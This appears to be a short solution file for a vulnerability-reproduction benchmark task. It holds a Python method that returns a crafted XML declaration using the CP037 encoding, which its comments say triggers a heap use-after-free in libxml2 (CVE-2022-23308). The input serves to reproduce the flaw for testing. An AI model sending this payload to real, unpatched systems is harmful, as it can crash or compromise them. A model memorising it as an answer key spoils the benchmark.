import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # CVE-2022-23308: Heap Use After Free in xmlOutputBufferCreate
        # The vulnerability is triggered when saving a document with an encoding
        # that requires a dynamically allocated handler (non-built-in, e.g. via iconv),
        # and an error occurs or the handler ownership is mishandled.
        # "CP037" (EBCDIC) is a 5-character encoding name that fits exactly into
        # a 24-byte XML declaration: <?xml encoding="CP037"?>
        return b'<?xml encoding="CP037"?>'